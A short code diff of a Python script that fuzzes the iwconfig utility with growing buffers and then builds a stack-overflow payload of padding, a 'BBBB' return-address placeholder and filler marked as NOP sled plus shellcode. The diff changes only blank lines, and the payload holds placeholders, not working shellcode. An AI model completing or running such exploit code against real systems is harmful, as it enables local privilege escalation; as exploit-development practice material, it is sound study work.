@@ -11,7 +11,6 @@ kernel_res = kernel_output.decode().split(" ")
 if kernel_res[2] == 1:
     sys.exit(1)
 
-
 buffer = b"A"
 command = ["iwconfig", buffer.decode()]
 
@@ -43,7 +42,6 @@ while True:
             command = ["iwconfig", buffer.decode()]
             continue
         else:
-
             find_sp = b"A" * (len(buffer) - 4) + b"BBBB" + b"C" * 10028   #10000 nops + 28 bytes shellcode
             command = ["iwconfig", find_sp.decode()]
             iwconfig = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
